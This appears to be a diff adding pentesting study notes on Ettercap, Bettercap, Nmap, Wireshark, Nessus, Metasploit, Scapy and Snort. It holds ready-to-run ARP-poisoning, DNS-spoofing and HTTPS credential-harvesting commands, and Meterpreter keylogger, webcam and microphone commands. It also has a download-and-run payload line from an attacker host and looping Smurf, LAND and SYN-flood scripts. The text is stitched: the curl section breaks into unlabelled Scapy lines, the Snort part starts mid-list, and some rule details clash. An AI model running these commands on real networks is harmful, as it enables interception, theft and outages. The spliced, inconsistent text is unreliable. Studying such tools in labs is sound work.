@@ -1,0 +1,1460 @@
+> > > > ETTERCAP (MAN-IN-THE-MIDDLE TOOL)
+
+=> What is Ettercap
+-> Network Man-in-the-Middle (MITM) attack tool
+-> Used mainly for ARP Poisoning
+-> Works on Local Area Network (LAN)
+-> Can sniff traffic, spoof DNS, capture credentials
+-> Old but very important for fundamentals
+
+=> Network Requirement
+-> Attacker, Victim, Gateway must be in same network
+-> Attacker must have root privileges
+-> Works best in switched networks using ARP spoofing
+
+=> Modes of Ettercap
+-> Text mode (-T)
+-> Graphical mode (-G)
+-> Unified sniffing mode
+
+=> Important Configuration
+-> File path: /etc/ettercap/etter.conf
+-> Open file using editor
+-> Change user and group permissions
+-> ec_uid = 0
+-> ec_gid = 0
+-> Save file and exit
+
+---
+
+> > > > ETTERCAP ARP POISONING
+
+=> What is ARP Poisoning
+-> Attacker sends fake ARP replies
+-> Victim thinks attacker is gateway
+-> Gateway thinks attacker is victim
+-> All traffic passes through attacker
+
+=> ARP Poisoning (Text Mode)
+-> ettercap -T -q -i eth0 -M arp /victim_ip/ /gateway_ip/
+
+=> ARP Poisoning (Whole Network)
+-> ettercap -T -q -i eth0 -M arp /// ///
+
+=> Command Flags Meaning
+-> -T => text mode
+-> -q => quiet mode
+-> -i => network interface
+-> -M => MITM attack
+-> arp => ARP poisoning method
+
+=> Auto Add New Hosts
+-> Useful when new device joins network
+-> ettercap -T -q -i eth0 -M arp /// /// -P autoadd
+
+---
+
+> > > > ETTERCAP DNS SPOOFING
+
+=> What is DNS Spoofing
+-> Fake DNS responses sent to victim
+-> Victim redirected to attacker IP
+-> Used for phishing and fake websites
+
+=> DNS Configuration File
+-> File path: /etc/ettercap/etter.dns
+
+=> Example Entries
+-> facebook.com A 192.168.1.10
+-> .google.com A 192.168.1.10
+-> * A 192.168.1.10
+
+=> Start Fake Web Server
+-> python3 -m http.server 80
+
+=> Run Ettercap with DNS Plugin
+-> ettercap -T -q -i eth0 -M arp /// /// -P dns_spoof
+
+=> GUI Method
+-> Run ettercap -G
+-> Scan for hosts
+-> Select victims
+-> MITM -> ARP poisoning
+-> Plugins -> dns_spoof (enable)
+
+=> Limitations of Ettercap
+-> HTTPS shows certificate warning
+-> Cannot decrypt HTTPS traffic
+-> Easily detectable (noisy)
+
+---
+
+> > > > BETTERCAP (MODERN MITM FRAMEWORK)
+
+=> What is Bettercap
+-> Modern replacement of Ettercap
+-> Written in Go language
+-> Supports HTTPS MITM
+-> Modular and interactive
+-> Used in real-world MITM scenarios
+
+=> Installation
+-> apt update
+-> apt install bettercap
+
+=> Start Bettercap
+-> bettercap -iface eth0
+
+---
+
+> > > > BETTERCAP IMPORTANT MODULES
+
+=> Core Modules
+-> arp.spoof => ARP poisoning
+-> net.probe => discover live hosts
+-> net.sniff => sniff packets
+-> http.proxy => intercept HTTP traffic
+-> https.proxy => intercept HTTPS traffic
+
+---
+
+> > > > BETTERCAP ARP SPOOFING
+
+=> Target Single Victim
+-> set arp.spoof.targets 192.168.1.5
+-> arp.spoof on
+
+=> Target Entire Network
+-> set arp.spoof.targets 192.168.1.0/24
+-> arp.spoof on
+
+=> One-Line Command
+-> bettercap -iface eth0 -eval "arp.spoof on; set arp.spoof.targets 192.168.1.5;"
+
+---
+
+> > > > BETTERCAP HTTP / HTTPS MITM
+
+=> Enable Proxies
+-> http.proxy on
+-> https.proxy on
+
+=> Sniff Credentials
+-> net.sniff on
+-> events.stream on
+
+=> HTTPS MITM Working
+-> Bettercap generates fake SSL certificate
+-> Victim accepts certificate
+-> HTTPS traffic decrypted
+-> Credentials can be captured
+
+---
+
+> > > > BETTERCAP JAVASCRIPT INJECTION
+
+=> Purpose
+-> Modify web pages in victim browser
+-> Inject scripts or replace content
+
+=> JS Injection Steps
+-> Create JavaScript file (example inject.js)
+-> Remove Accept-Encoding header
+-> Modify HTTP response body
+
+=> Enable Script Injection
+-> set http.proxy.script inject.js
+-> set https.proxy.script inject.js
+
+---
+
+> > > > ETTERCAP vs BETTERCAP
+
+=> Ettercap
+-> Old tool
+-> Simple ARP poisoning
+-> Mainly HTTP
+-> GUI available
+-> Less effective on HTTPS
+
+=> Bettercap
+-> Modern tool
+-> Full HTTPS MITM
+-> Script injection
+-> CLI based
+-> Used in advanced labs
+
+---
+
+> > > > WHEN TO USE WHICH
+
+=> Use Ettercap
+-> Learning MITM basics
+-> ARP poisoning demo
+-> DNS spoofing practice
+
+=> Use Bettercap
+-> HTTPS attacks
+-> Credential harvesting
+-> Advanced MITM labs
+
+
+======================================================================
+
+> > > > NMAP (NETWORK MAPPER)
+
+=> What is Nmap
+-> Network scanning and enumeration tool
+-> Used to discover hosts, ports, services
+-> Helps in vulnerability assessment
+-> Works in active and passive modes
+
+=> Basic Uses
+-> Host discovery
+-> Port scanning
+-> Service and version detection
+-> OS detection
+-> Firewall / IDS evasion
+
+---
+
+> > > > BASIC NMAP COMMANDS
+
+=> Scan a Single Target
+-> nmap 192.168.1.10
+
+=> Scan Multiple Targets
+-> nmap 192.168.1.10 192.168.1.20
+
+=> Scan Network Range
+-> nmap 192.168.1.0/24
+
+=> Scan from File
+-> nmap -iL targets.txt
+
+---
+
+> > > > HOST DISCOVERY (PING SCAN)
+
+=> Ping Scan
+-> nmap -sn 192.168.1.0/24
+-> Discovers live hosts only
+-> No port scan performed
+
+=> Disable Ping (Force Scan)
+-> nmap -Pn 192.168.1.10
+-> Useful when ICMP is blocked
+
+---
+
+> > > > PORT SCANNING TYPES
+
+=> TCP SYN Scan (Stealth Scan)
+-> nmap -sS 192.168.1.10
+-> Default scan (root required)
+-> Fast and stealthy
+
+=> TCP Connect Scan
+-> nmap -sT 192.168.1.10
+-> Uses full TCP handshake
+-> Used when no root access
+
+=> UDP Scan
+-> nmap -sU 192.168.1.10
+-> Slow but important
+-> Used to find DNS, SNMP, etc.
+
+---
+
+> > > > ADVANCED SCAN TYPES (FROM DOCUMENT)
+
+=> NULL Scan
+-> nmap -sN 192.168.1.10
+-> Sends packet with no TCP flags
+-> Open ports ignore packet
+-> Closed ports send RST
+
+=> XMAS Scan
+-> nmap -sX 192.168.1.10
+-> FIN, PSH, URG flags set
+-> Closed ports reply with RST
+
+=> FIN Scan
+-> nmap -sF 192.168.1.10
+-> Uses FIN flag
+-> Similar behavior to NULL scan
+
+=> Purpose of These Scans
+-> Firewall evasion
+-> IDS evasion
+-> Covert scanning
+
+---
+
+> > > > PORT SELECTION
+
+=> Scan Specific Ports
+-> nmap -p 22,80,443 192.168.1.10
+
+=> Scan Port Range
+-> nmap -p 20-100 192.168.1.10
+
+=> Scan All Ports
+-> nmap -p 0-65535 192.168.1.10
+-> OR
+-> nmap -p- 192.168.1.10
+
+---
+
+> > > > SERVICE & VERSION DETECTION
+
+=> Service Detection
+-> nmap -sV 192.168.1.10
+-> Detects running services
+
+=> OS Detection
+-> nmap -O 192.168.1.10
+-> Guess operating system
+
+=> Default Script Scan
+-> nmap -sC 192.168.1.10
+-> Runs safe NSE scripts
+
+=> Combined Scan (OVERT)
+-> nmap -sS -sV -O -sC -p- 192.168.1.10
+
+---
+
+> > > > SOURCE PORT MANIPULATION
+
+=> What is Source Port Manipulation
+-> Spoof source port to bypass firewall
+-> Firewall may trust traffic from port 53 or 80
+
+=> Command Example
+-> nmap -sS -p 21,22,80 -g 53 192.168.1.10
+
+=> Verification
+-> Capture traffic in Wireshark
+-> Filter: tcp.port == 53
+
+---
+
+> > > > DECOY SCANNING
+
+=> What is Decoy Scan
+-> Hide real attacker IP
+-> Confuse IDS and logs
+
+=> Decoy Scan Command
+-> nmap -sS -D 192.168.1.5,192.168.1.6 192.168.1.10
+
+=> Random Decoys
+-> nmap -sS -D RND:10 192.168.1.10
+
+=> ME Keyword
+-> nmap -sS -D ME,RND:5 192.168.1.10
+-> ME = attacker IP placed randomly
+
+---
+
+> > > > IDLE / ZOMBIE SCAN (PASSIVE SCAN)
+
+=> What is Idle Scan
+-> Completely hides attacker IP
+-> Uses zombie host
+-> Passive scanning technique
+
+=> Requirement
+-> Zombie must have predictable IP ID
+-> Zombie should be idle
+
+=> Command
+-> nmap -sI zombie_ip target_ip
+
+=> Example
+-> nmap -sI 192.168.1.5 192.168.1.10
+
+---
+
+> > > > OVERT vs COVERT SCANNING
+
+=> Overt Scanning
+-> Fast and noisy
+-> Used in authorized testing
+-> Easy detection by IDS
+
+=> Overt Command Example
+-> nmap -p- -sS -sV -O -sC --reason 192.168.1.10
+
+=> Covert Scanning
+-> Slow and stealthy
+-> IDS evasion
+-> Used in red team exercises
+
+=> Covert Techniques
+-> NULL scan
+-> XMAS scan
+-> Decoy scan
+-> Source port manipulation
+-> Idle scan
+
+---
+
+> > > > PERFORMANCE TUNING (FROM DOCUMENT)
+
+=> Control Parallelism
+-> --min-parallelism 10
+
+=> Control Retries
+-> --max-retries 2
+
+=> Control Delay
+-> --max-scan-delay 5
+
+=> Host Grouping
+-> --min-hostgroup 10
+-> --max-hostgroup 20
+
+=> Example
+-> nmap -sSVC -p- --source-port 53 --min-parallelism 10 --max-retries 2 --max-scan-delay 5 192.168.1.0/24
+
+---
+
+> > > > IMPORTANT FLAGS
+
+=> --reason
+-> Shows why port is open/closed
+
+=> -v
+-> Verbose output
+
+=> -A
+-> Aggressive scan (OS + version + script)
+
+---
+
+> > > > IMPORTANT NOTES
+
+=> Nmap scans can be logged
+=> IDS/Firewall may detect scans
+=> Always use in authorized labs
+=> Combine multiple scan types for accuracy
+
+
+========================================================================================================
+
+
+
+> > > > WIRESHARK (NETWORK PACKET ANALYZER)
+
+=> What is Wireshark
+-> Network packet capture and analysis tool
+-> Used to inspect live network traffic
+-> Works on wired and wireless networks
+-> Helps in troubleshooting and security analysis
+
+=> Uses of Wireshark
+-> Capture packets in real time
+-> Analyze protocols
+-> Detect suspicious traffic
+-> Verify attacks like ARP poisoning, scanning
+
+---
+
+> > > > WIRESHARK BASIC CONCEPTS
+
+=> Packet
+-> Small unit of data sent over network
+
+=> Capture
+-> Process of recording live traffic
+
+=> Interface
+-> Network card used for capture
+-> Example: eth0, wlan0
+
+=> Display Filter
+-> Filters packets after capture
+-> Does not affect capture process
+
+=> Capture Filter
+-> Filters packets before capture
+-> Reduces noise
+
+---
+
+> > > > STARTING WIRESHARK
+
+=> Start Wireshark
+-> wireshark
+
+=> Select Interface
+-> Choose eth0 for wired
+-> Choose wlan0 for wireless
+
+=> Start Capture
+-> Click Start button
+-> Packets start appearing
+
+---
+
+> > > > WIRESHARK FILTERS
+
+=> Display Filters (Most Used)
+
+-> http
+-> https
+-> tcp
+-> udp
+-> icmp
+-> dns
+-> arp
+
+=> IP Based Filter
+-> ip.addr == 192.168.1.10
+
+=> Source IP
+-> ip.src == 192.168.1.5
+
+=> Destination IP
+-> ip.dst == 192.168.1.1
+
+=> Port Filter
+-> tcp.port == 80
+-> udp.port == 53
+
+---
+
+> > > > WIRESHARK CAPTURE FILTERS
+
+=> Capture Filter Examples
+-> tcp
+-> udp
+-> icmp
+-> arp
+-> port 80
+-> host 192.168.1.10
+
+---
+
+> > > > WIRESHARK FOR SECURITY LABS
+
+=> Detect Nmap Scans
+-> SYN scan shows many SYN packets
+-> No full handshake
+
+=> Detect ARP Poisoning
+-> arp filter
+-> Multiple ARP replies
+-> Same IP with different MAC addresses
+
+=> Detect DNS Spoofing
+-> dns filter
+-> Wrong IP in DNS response
+
+=> Verify Source Port Manipulation
+-> tcp.port == 53
+-> Check source port in packets
+
+---
+
+> > > > WIRESHARK WITH NMAP
+
+=> Capture Nmap Scan
+-> Start Wireshark
+-> Run Nmap scan
+-> Stop capture
+
+=> Useful Filters
+-> tcp.flags.syn == 1
+-> tcp.flags.reset == 1
+
+---
+
+> > > > WIRESHARK WITH ETTERCAP / BETTERCAP
+
+=> Verify MITM Attack
+-> arp filter
+-> Check ARP replies
+
+=> Capture Credentials (HTTP)
+-> http filter
+-> Look for POST requests
+-> Username and password visible
+
+---
+
+> > > > IMPORTANT WIRESHARK SHORTCUTS
+
+=> Follow TCP Stream
+-> Right click on packet
+-> Follow -> TCP Stream
+
+=> Packet Details
+-> Expand protocol layers
+-> Ethernet
+-> IP
+-> TCP / UDP
+-> Application layer
+
+---
+
+> > > > LIMITATIONS
+
+=> Cannot decrypt HTTPS without keys
+=> Large captures consume memory
+=> Needs root permissions
+
+---
+
+> > > > IMPORTANT NOTES
+
+=> Wireshark is passive tool
+=> Does not send packets
+=> Legal only on authorized networks
+=> Very useful for verification of attacks
+
+---
+
+
+=================================================================================
+
+
+
+> > > > NESSUS (VULNERABILITY SCANNER)
+
+=> What is Nessus
+-> Automated vulnerability assessment tool
+-> Developed by Tenable
+-> Used to find security weaknesses
+-> Scans systems, servers, applications
+-> Commonly used by security teams
+
+=> Purpose of Nessus
+-> Identify vulnerabilities
+-> Detect misconfigurations
+-> Find missing patches
+-> Provide risk severity
+
+---
+
+> > > > NESSUS KEY CONCEPTS
+
+=> Vulnerability
+-> Security weakness in system or software
+
+=> Plugin
+-> Small test used by Nessus
+-> Each plugin checks specific vulnerability
+
+=> CVE
+-> Common Vulnerabilities and Exposures ID
+-> Used to identify known issues
+
+=> CVSS
+-> Scoring system for vulnerabilities
+-> Range 0 to 10
+
+---
+
+> > > > NESSUS SEVERITY LEVELS
+
+=> Critical
+-> CVSS 9.0 â€“ 10.0
+-> Immediate action required
+
+=> High
+-> CVSS 7.0 â€“ 8.9
+
+=> Medium
+-> CVSS 4.0 â€“ 6.9
+
+=> Low
+-> CVSS 0.1 â€“ 3.9
+
+=> Informational
+-> No immediate risk
+-> Just information
+
+---
+
+> > > > NESSUS TYPES OF SCANS
+
+=> Basic Network Scan
+-> Common vulnerabilities
+-> Default scan for beginners
+
+=> Advanced Scan
+-> Full control over plugins and settings
+
+=> Credentialed Scan
+-> Uses system credentials
+-> More accurate results
+
+=> Non-Credentialed Scan
+-> External view
+-> Less detailed
+
+---
+
+> > > > INSTALLATION (KALI)
+
+=> Download Nessus
+-> Official website: tenable.com
+
+=> Install Package
+-> dpkg -i Nessus-*.deb
+
+=> Start Service
+-> systemctl start nessusd
+
+=> Access Web Interface
+-> [https://localhost:8834](https://localhost:8834)
+
+---
+
+> > > > INITIAL SETUP
+
+=> Create Account
+-> Choose Nessus Essentials (Free)
+-> Register using email
+
+=> Plugin Update
+-> Plugins download automatically
+-> Wait until initialization completes
+
+---
+
+> > > > CREATING A SCAN
+
+=> Steps
+-> New Scan
+-> Select scan template
+-> Enter scan name
+-> Enter target IP or range
+-> Save and launch scan
+
+=> Example Targets
+-> 192.168.1.10
+-> 192.168.1.0/24
+
+---
+
+> > > > SCAN RESULTS
+
+=> Scan Dashboard
+-> Shows vulnerabilities count
+-> Categorized by severity
+
+=> Vulnerability Details
+-> Name
+-> Description
+-> Affected port
+-> CVE ID
+-> CVSS score
+-> Solution or fix
+
+---
+
+> > > > CREDENTIAL SCANNING
+
+=> What is Credentialed Scan
+-> Nessus logs into target system
+-> Checks internal vulnerabilities
+
+=> Advantages
+-> More accurate findings
+-> Less false positives
+
+=> Disadvantages
+-> Requires username/password
+-> Higher privilege needed
+
+---
+
+> > > > FALSE POSITIVES
+
+=> What is False Positive
+-> Vulnerability reported but not actually exploitable
+
+=> How to Handle
+-> Manually verify vulnerability
+-> Cross-check using tools
+-> Mark as false positive
+
+---
+
+> > > > NESSUS REPORTS
+
+=> Report Formats
+-> HTML
+-> PDF
+-> CSV
+
+=> Report Contents
+-> Vulnerability summary
+-> Risk level
+-> Fix recommendation
+
+---
+
+> > > > NESSUS LIMITATIONS
+
+=> Free version limitations
+-> Limited IP scans
+-> Home/lab use only
+
+=> Nessus cannot exploit
+-> Only detects vulnerabilities
+-> Exploitation requires other tools
+
+---
+
+> > > > NESSUS vs NMAP
+
+=> Nessus
+-> Vulnerability scanner
+-> Automated analysis
+-> CVE based
+
+=> Nmap
+-> Network scanner
+-> Manual analysis
+-> Port and service discovery
+
+---
+
+> > > > IMPORTANT NOTES
+
+=> Nessus is noisy
+=> IDS may detect scans
+=> Use only in authorized environment
+=> Best used after Nmap scanning
+
+---
+
+=====================================================================
+
+> > > > METASPLOIT FRAMEWORK
+
+=> What is Metasploit
+-> Penetration testing framework
+-> Used to exploit vulnerabilities
+-> Developed by Rapid7
+-> Written mainly in Ruby
+-> Used by attackers and defenders
+
+=> Purpose
+-> Vulnerability exploitation
+-> Payload delivery
+-> Post-exploitation
+-> Security testing
+
+---
+
+> > > > METASPLOIT ARCHITECTURE
+
+=> Language
+-> Ruby
+
+=> Organization
+-> Rapid7
+
+=> Installation Path
+-> /usr/share/metasploit-framework
+
+=> Database
+-> PostgreSQL
+
+=> Interfaces
+-> CLI => msfconsole
+-> GUI => Armitage
+-> Pro version => Web UI
+
+---
+
+> > > > METASPLOIT MODULE TYPES
+
+=> Exploit Module
+-> Used to exploit vulnerabilities
+-> Break security of target
+
+=> Auxiliary Module
+-> Used for scanning and enumeration
+-> Does NOT exploit
+-> Example: scanners, brute force
+
+=> Payload Module
+-> Code executed after exploitation
+-> Example: meterpreter, shell
+
+=> Encoder Module
+-> Used to bypass antivirus
+-> Encodes payload
+
+=> Evasion Module
+-> Avoid detection by AV
+
+=> NOPs
+-> Used to pad payload
+-> Avoid memory issues
+
+=> Post Module
+-> Used after exploitation
+-> Information gathering, privilege escalation
+
+---
+
+> > > > METASPLOIT DATABASE SETUP
+
+=> Check PostgreSQL Status
+-> systemctl is-active postgresql
+
+=> Initialize Database
+-> msfdb init
+
+=> Reinitialize Database
+-> msfdb reinit
+
+=> Start Metasploit
+-> msfconsole
+
+---
+
+> > > > METASPLOIT BASICS
+
+=> Load Module
+-> use <module_name>
+
+=> Show Options
+-> show options
+
+=> Set Option
+-> set <option> <value>
+
+=> Run Exploit
+-> run
+-> exploit
+
+---
+
+> > > > METASPLOIT TARGET TYPES
+
+=> Windows
+=> Linux / Unix
+=> Web Servers
+=> Android
+
+---
+
+> > > > WINDOWS PAYLOAD (FROM NOTES)
+
+=> Payload Example
+-> payload/windows/x64/meterpreter/reverse_tcp
+
+=> Payload Meaning
+-> windows => target OS
+-> x64 => architecture
+-> meterpreter => connection type
+-> reverse_tcp => reverse shell
+
+=> Load Payload
+-> use payload/windows/x64/meterpreter/reverse_tcp
+
+=> Required Options
+-> LHOST => attacker IP
+-> LPORT => listening port
+
+=> Set Options
+-> set LHOST <attacker_ip>
+-> set LPORT <port>
+
+---
+
+> > > > GENERATE PAYLOAD
+
+=> Generate Executable
+-> Payload saved as .exe
+-> Victim executes file
+
+=> NOTE
+-> Generated payload is detectable
+-> Antivirus will flag it
+
+---
+
+> > > > MULTI HANDLER (LISTENER)
+
+=> Purpose
+-> Listen for reverse connection
+
+=> Steps
+-> back
+-> use exploit/multi/handler
+-> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+-> set LHOST <attacker_ip>
+-> set LPORT <port>
+-> run
+
+---
+
+> > > > METERPRETER SESSION
+
+=> What is Meterpreter
+-> Advanced payload
+-> Runs in memory
+-> Gives full control
+
+=> Useful Meterpreter Commands
+-> sysinfo => victim system info
+-> show_mount => drives and partitions
+-> shell => victim command prompt
+-> screenshot => capture screen
+-> webcam_list => list cameras
+-> webcam_snap <no> => take photo
+-> webcam_stream => live camera
+-> keyscan_start => start keylogger
+-> keyscan_dump => dump keys
+-> keyscan_stop => stop keylogger
+-> record_mic -d 20 => record audio
+-> upload -r <path> => upload files
+-> download -f <path> => download files
+
+---
+
+> > > > PROCESS MIGRATION
+
+=> Purpose
+-> Hide meterpreter
+-> Make session stable
+
+=> Steps
+-> getpid => current process ID
+-> ps | grep explorer.exe
+-> migrate <pid>
+
+---
+
+> > > > SESSION MANAGEMENT
+
+=> List Sessions
+-> sessions -l
+
+=> Interact with Session
+-> sessions -i <id>
+
+=> Kill Session
+-> sessions -k <id>
+
+=> Background Session
+-> background
+
+---
+
+> > > > LINUX PAYLOAD EXECUTION
+
+=> Download Payload
+-> wget http://attacker_ip/prog
+
+=> Give Permission
+-> chmod +x prog
+
+=> Execute
+-> ./prog
+
+=> Run in Background
+-> ./prog 2>&1 &> /dev/null &
+
+---
+
+> > > > METASPLOIT WITH NMAP
+
+=> Use db_nmap
+-> db_nmap -sSVC --script=vuln 192.168.74.178
+
+=> View Results
+-> hosts
+-> services
+
+---
+
+> > > > IMPORTANT NOTES
+
+=> Metasploit is loud
+=> Easily detected by IDS
+=> Payloads are mostly detectable
+=> Use only in lab / authorized environment
+
+
+===================================================================================
+
+
+> > > > CURL (COMMAND LINE WEB CLIENT)
+
+=> What is CURL
+-> Command-line tool to send HTTP/HTTPS requests
+-> Used to interact with web servers
+-> Supports multiple protocols
+-> Commonly used in security testing and debugging
+
+=> CURL Full Form
+-> Client URL
+
+=> Protocols Supported
+-> HTTP
+-> HTTPS
+-> FTP
+-> FTPS
+-> SCP
+-> SFTP
+
+---
+
+> > > > BASIC CURL COMMANDS
+
+=> Simple GET Request
+-> curl "[http://example.com](http://example.com)"
+
+=> HTTPS Request
+-> curl "[https://example.com](https://example.com)"
+
+=> Ignore SSL Certificate Error
+-> curl -k "[https://example.com](https://example.com)"
+-> Used when server has self-signed certificate
+
+=> Silent Mode
+-> curl -s "[https://example.com](https://example.com)"
+-> Hides progress bar
+
+=> Combine Flags
+-> curl -ks "[https://example.com](https://example.com)"
+
+---
+
+> > > > VIEW RESPONSE HEADERS
+
+=> Response Headers Only
+-> curl -I "[https://example.com](https://example.com)"
+
+=> Response Header + Body
+-> curl -i "[https://example.com](https://example.com)"
+
+=> Verbose Mode (Request + Response)
+-> curl -v "[https://example.com](https://example.com)"
+-> Shows request headers sent by client
+
+---
+
+> > > > MODIFY REQUEST HEADERS
+
+=> Add Single Header
+-> curl -H "User-Agent: Mozilla/5.0" "[https://example.com](https://example.com)"
+
+=> Add Multiple Headers
+-> curl -H "Header1: value1" -H "Header2: value2" "[https://example.com](https://example.com)"
+
+=> Change User-Agent
+-> curl -H "User-Agent: CustomAgent" "[https://example.com](https://example.com)"
+
+---
+
+=> Send Packet Multiple Times
+-> send(b/a, count=5)
+
+=> Send Packet in Loop
+-> send(b/a, loop=1)
+
+=> Send Large Packet
+-> send(b/a/"randomdatahere")
+
+=> Interface Option
+-> send(b/a, iface=eth1)
+-> Note: may not work in some setups
+
+---
+
+> > > > ICMP PACKET CRAFTING
+
+=> Create IP and ICMP Objects
+-> x = IP()
+-> y = ICMP()
+
+=> View Packet Structure
+-> x.show()
+-> y.show()
+
+=> Set Source and Destination
+-> x.src = "x.x.x.x"
+-> x.dst = "x.x.x.x"
+
+=> Send ICMP Packet
+-> send(x/y)
+
+=> Send ICMP with Payload
+-> send(x/y/"LOLOLOLOL")
+
+=> Send Multiple ICMP Packets
+-> send(x/y, count=10)
+
+=> Send ICMP Continuously
+-> send(x/y, loop=1)
+
+=> Verification
+-> Check packets in Wireshark
+
+---
+
+> > > > TCP PACKET CRAFTING
+
+=> Create IP and TCP Objects
+-> a = IP()
+-> b = TCP()
+
+=> Set IP Addresses
+-> a.src = "x.x.x.x"
+-> a.dst = "196.1.113.45"
+
+=> Set Ports
+-> b.sport = 53
+-> b.dport = 80
+
+=> Set TCP Flag
+-> b.flags = "S"
+
+=> Send TCP SYN Packets
+-> send(a/b, count=10)
+
+---
+
+> > > > ATTACKS USING SCAPY (PACKET CRAFTING)
+
+=> Types of Attacks
+-> Smurf Attack
+-> LAND Attack
+-> SYN Flood Attack
+
+---
+
+> > > > SMURF ATTACK
+
+=> Type
+-> DoS Attack
+-> Very old attack
+-> Mostly mitigated today
+
+=> Concept
+-> ICMP request sent to broadcast address
+-> Source IP spoofed as victim IP
+-> All hosts reply to victim
+
+=> Reason
+-> ICMP has no handshake
+-> Source IP cannot be verified
+
+=> Modern Status
+-> Routers block ICMP broadcast
+-> Attack mostly ineffective today
+
+=> Scapy Example
+-> x = IP()/ICMP()
+-> x.show()
+-> x.src = "victim_IP"
+-> x.dst = "target_IP"
+-> x.show()
+-> send(x, loop=1)
+
+=> Verification
+-> Check ICMP traffic in Wireshark
+
+---
+
+> > > > LAND ATTACK
+
+=> Type
+-> DoS (Denial of Service)
+
+=> Concept
+-> Source IP = Destination IP
+-> Victim sends response to itself
+-> System resources exhausted
+
+=> Scapy Example
+-> x = IP()/TCP()
+-> x.show()
+-> x.src = "victim_IP"
+-> x.dst = "victim_IP"
+-> x.show()
+-> send(x, loop=1)
+
+---
+
+> > > > SYN FLOOD ATTACK
+
+=> Also Known As
+-> Half-open attack
+
+=> Concept
+-> Attacker sends multiple SYN packets
+-> Does not complete handshake
+-> Victim resources get exhausted
+
+=> Scapy Example
+-> a = IP()
+-> b = TCP()
+-> a.src = "zombie_IP"
+-> a.dst = "victim_IP"
+-> b.flags = "S"
+-> send(a/b, loop=1)
+
+---
+
+> > > > SCAPY + WIRESHARK
+
+=> Purpose
+-> Verify crafted packets
+-> Analyze attack traffic
+
+=> Wireshark Filters
+-> icmp
+-> tcp.flags.syn == 1
+
+---
+
+> > > > IMPORTANT NOTES
+
+=> Scapy is very powerful
+=> Easy to generate DoS traffic
+=> Can crash systems if misused
+=> Use only in lab / authorized network
+=> Always verify packets using Wireshark
+
+
+-> dst port
+
+=> Rule Options
+-> msg
+-> sid
+-> rev
+-> content
+-> flags
+
+=> Rule Syntax
+-> <action> <proto> <src_ip> <src_port> -> <dst_ip> <dst_port> (options)
+
+=> SID Rule
+-> Custom SID starts from 100001
+-> Below 100000 reserved
+
+---
+
+> > > > RULE ACTION TYPES
+
+=> alert
+-> Alert + log
+
+=> log
+-> Only log
+
+=> pass
+-> Ignore packet
+
+=> drop
+-> Block + log (INLINE MODE)
+
+=> reject
+-> Block + log + send reset
+
+=> sdrop
+-> Block silently
+
+---
+
+> > > > CUSTOM RULE EXAMPLES
+
+=> ANY Packet Detection
+-> alert ip any any -> any any (msg:"IP Packet detected"; sid:100001; rev:1;)
+
+=> ICMP (PING) Detection
+-> alert icmp any any -> $HOME_NET any (msg:"LOL ICMP"; sid:1000001; rev:1;)
+
+=> FTP Connection Detection
+-> alert tcp any any -> $HOME_NET 21 (msg:"FTP Connection"; sid:1000002; rev:1;)
+
+---
+
+> > > > TCP FLAG DETECTION
+
+=> TCP Flags
+-> F => FIN
+-> S => SYN
+-> R => RST
+-> P => PSH
+-> A => ACK
+-> U => URG
+-> 0 => No flag
+
+=> Logical Operators
+-> + => All flags
+-> * => Any flag
+-> ! => NOT flag
+
+=> SYN Detection Rule
+-> alert tcp any any -> $HOME_NET any (flags:S; msg:"SYN Packet"; sid:1000003; rev:1;)
+
+---
+
+> > > > CONTENT MATCHING RULE
+
+=> SSH Detection
+-> alert tcp any any -> $HOME_NET 22 (msg:"SSH Attempt"; content:"SSH"; sid:1000003; rev:1;)
+
+=> Test Using Scapy
+-> send(IP()/TCP(flags="S")/"SSH")
+
+---
+
+> > > > LOGGING & ASCII MODE
+
+=> Enable ASCII Logging
+-> snort -A console -q -i eth0 -c /etc/snort/snort.conf -K ascii
+
+=> Logs Location
+-> /var/log/snort/
+
+=> ASCII Logs
+-> snort.log*
+
+=> Per Host Logs
+-> /var/log/snort/x.x.x.x/
+
+---
+
+> > > > VARIABLES IN RULES
+
+=> Define Variables
+-> var WEB_PORTS [80,8080,9000,10000]
+-> var WEB_IPs [10.0.0.0/24,192.168.1.0/24]
+
+=> SQLi Example Rule
+-> alert tcp any any -> $WEB_IPs $WEB_PORTS (msg:"SQLi"; uricontent:"/index.php"; content:"%27"; content:"or"; content:"1%3D1"; nocase; sid:10000007; rev:1;)
+
+---
+
+> > > > CLASSTYPE & PRIORITY
+
+=> Classtype
+-> Categorizes attack type
+-> Defined in classification.config
+-> Syntax:
+-> classtype:<name>;
+
+=> Priority
+-> Severity level
+-> 1 => High
+-> 4 => Low
+-> Syntax:
+-> priority:<number>;
+
+=> Example
+-> alert tcp any any -> any 80 (msg:"EXPLOIT"; classtype:attempted-admin; priority:10;)
